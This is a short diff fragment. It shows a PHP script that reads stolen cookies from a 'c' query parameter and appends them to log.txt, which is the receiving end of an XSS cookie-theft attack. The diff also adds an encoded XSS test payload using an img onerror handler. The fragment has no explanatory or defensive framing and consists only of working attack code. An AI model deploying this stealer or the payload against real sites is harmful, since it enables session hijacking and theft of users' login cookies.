@@ -34,3 +34,5 @@ $cookies=$_GET["c"];
 $file=fopen('log.txt', 'a');
 fwrite($file, $cookies . "\n\n");
 ?>
+
+ "&gt;&lt;img src=x onerror=alert(document.domain)&gt; 
